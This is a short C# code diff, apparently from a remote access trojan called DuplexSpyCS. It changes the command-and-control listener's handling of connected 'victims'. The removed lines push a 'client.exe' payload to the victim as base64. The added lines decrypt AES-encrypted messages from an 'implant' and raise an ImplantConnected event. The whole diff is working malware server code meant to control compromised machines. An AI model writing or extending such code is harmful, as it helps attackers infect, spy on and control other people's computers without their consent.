@@ -50,6 +50,9 @@ namespace DuplexSpyCS
         public delegate void DisconenctedEventHandler(Victim v);
         public event DisconenctedEventHandler Disconencted; //Disconnected event.
 
+        public delegate void ImplantConnectedHandler(Listener l, Victim v, string[] aszMsg);
+        public event ImplantConnectedHandler ImplantConnected;
+
         #endregion
 
         //STATUS
@@ -327,13 +330,13 @@ namespace DuplexSpyCS
                                     }).Start();
                                 }
                             }
-                            else if (dsp.Command == 3) //winClient48Small
+                            else if (dsp.Command == 3) //Implant
                             {
-                                string szClient = "client.exe";
-                                if (!File.Exists(szClient))
-                                    return;
+                                byte[] abEncData = dsp.GetMsg().msg;
+                                string szDecData = Crypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abEncData)), v._AES.key, v._AES.iv);
+                                string[] aszMsg = szDecData.Split("|");
 
-                                v.SendCommand("init|" + Convert.ToBase64String(File.ReadAllBytes(szClient)));
+                                ImplantConnected(this, v, aszMsg);
                             }
                         }
                     }
